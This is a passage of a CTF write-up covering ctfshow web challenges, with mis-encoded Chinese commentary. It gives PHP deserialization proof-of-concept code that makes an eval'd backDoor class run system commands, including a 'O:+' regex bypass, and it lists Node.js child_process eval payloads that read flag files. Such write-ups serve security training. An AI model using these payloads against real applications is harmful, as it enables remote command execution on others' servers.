</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">backDoor</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">private</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">private</span> <span class="nv">$code</span> <span class="o">=</span><span class="s1">&#39;system(&#34;cat fl*&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
</span></span></code></pre></div><h4 id="web258">web258<a hidden class="anchor" aria-hidden="true" href="#web258">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-02 17:44:47
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-02 21:38:56
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">info</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="k">class</span> <span class="nc">info</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">public</span> <span class="nv">$user</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">public</span> <span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="nv">$password</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[oc]:\d+:/i&#39;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">    <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é“é¢˜ç›¸å¯¹äºä¸Šä¸€é“é¢˜éœ€è¦æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">class</span> <span class="nc">ctfShowUser</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">=</span><span class="k">new</span> <span class="nx">backDoor</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">===</span><span class="nv">$u</span><span class="o">&amp;&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"> 
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"> 
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">class</span> <span class="nc">backDoor</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$code</span><span class="o">=</span><span class="s1">&#39;system(&#34;tac ./flag.php&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">());</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;O:&#39;</span><span class="p">,</span><span class="s1">&#39;O:+&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡+ç»•è¿‡</p>
<h4 id="web289">web289<a hidden class="anchor" aria-hidden="true" href="#web289">#</a></h4>
<p>flag.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nv">$xff</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span><span class="o">!==</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">	<span class="nv">$token</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$token</span><span class="o">==</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">		<span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">
</span></span><span class="line"><span class="ln">5</span><span class="cl">
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nv">$vip</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vip&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1">//vip can get flag one key
</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"></span><span class="nv">$vip</span><span class="o">-&gt;</span><span class="na">getFlag</span><span class="p">();</span>
</span></span></code></pre></div><p>æ ¹æ®é¢˜ç›®æç¤ºå­˜åœ¨flag.phpé¡µé¢ä¸”åªå…è®¸</p>
<h3 id="nodejs">node.js<a hidden class="anchor" aria-hidden="true" href="#nodejs">#</a></h3>
<h4 id="web334">web334<a hidden class="anchor" aria-hidden="true" href="#web334">#</a></h4>
<p>login.js</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">users</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../modules/user&#39;</span><span class="p">).</span><span class="nx">items</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">var</span> <span class="nx">findUser</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">return</span> <span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">return</span> <span class="nx">name</span><span class="o">!==</span><span class="s1">&#39;CTFSHOW&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">username</span> <span class="o">===</span> <span class="nx">name</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">password</span> <span class="o">===</span> <span class="nx">password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">/* GET home page. */</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;flag_here&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="kd">var</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">findUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"> 
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">regenerate</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;ç™»å½•å¤±è´¥&#39;</span><span class="p">});</span>        
</span></span><span class="line"><span class="ln">22</span><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">loginUser</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;ç™»å½•æˆåŠŸ&#39;</span><span class="p">,</span><span class="nx">ret_flag</span><span class="o">:</span><span class="nx">flag</span><span class="p">});</span>              
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;è´¦å·æˆ–å¯†ç é”™è¯¯&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="ln">30</span><span class="cl">  
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</span></span></code></pre></div><p>user.js</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nx">items</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="p">{</span><span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;CTFSHOW&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">]</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>å®¡è®¡ä¸€ä¸‹ä»£ç çœ‹åˆ°å·²ç»ç»™å‡ºäº†æ˜æ–‡çš„è´¦å·å¯†ç </p>
<p>ä½†æ˜¯è¦æ³¨æ„è¿™é‡Œ</p>
<pre tabindex="0"><code>return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;
</code></pre><p>è¿™é‡Œè¦å»è¾“å…¥çš„è´¦å·ä¸èƒ½ä¸ºCTFSHOWï¼Œä¸”è¾“å…¥çš„ç”¨æˆ·åè½¬æ¢ä¸ºå¤§å†™åä¸æ˜æ–‡è´¦å·ç›¸åŒå³å¯</p>
<p>é‚£å°±å¾ˆç®€å•äº†ï¼Œè¾“å…¥å°å†™çš„ctfshowå’Œå¯†ç 123456å³å¯å¾—åˆ°flag</p>
<p><img alt="image-20241213215625920" loading="lazy" src="assets/image-20241213215625920.png"></p>
<h4 id="web335">web335<a hidden class="anchor" aria-hidden="true" href="#web335">#</a></h4>
<p><img alt="image-20241213215731651" loading="lazy" src="assets/image-20241213215731651.png"></p>
<p>æŸ¥çœ‹æºä»£ç å¾—åˆ°hint</p>
<p><img alt="image-20241213215755455" loading="lazy" src="assets/image-20241213215755455.png"></p>
<p>çœ‹åˆ°evalçŒœæµ‹æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œjsä¸­çš„evalå‡½æ•°çš„åˆ©ç”¨ä¸phpä¸­çš„æœ‰æ‰€ä¸åŒ</p>
<p>Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>payload:</p>
<pre tabindex="0"><code>/?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()
/?eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;).toString()

require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()

global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;,[&#39;.&#39;]).toString()
</code></pre><p>é‚£ä¸ºä»€ä¹ˆä¸‹é¢çš„æ–¹æ³•ä¼šå›æ˜¾[object object]å‘¢ï¼Ÿ</p>
<pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;calc&#39;); //è¿™é¢˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆexecç”¨ä¸äº†
</code></pre><blockquote>
